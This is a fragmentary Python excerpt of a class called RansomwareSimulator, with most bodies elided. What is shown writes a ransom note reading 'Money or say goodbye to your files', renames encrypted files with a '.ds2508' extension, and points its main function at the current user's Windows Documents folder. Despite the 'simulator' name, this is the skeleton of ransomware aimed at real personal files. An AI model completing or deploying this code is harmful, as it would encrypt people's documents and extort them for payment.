...
class RansomwareSimulator:
    ...
    def create_readme(self):
        ...
        with open(readme_path, 'w') as file:
            file.write("Money or say goodbye to your files")
    ...
    def encrypt_file(self, file_path):
        ...
        encrypted_file_path = file_path + ".ds2508"
...
def main():
    ...
    directory = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')  # 'dosyalar/' should be replaced with the directory path you want to target
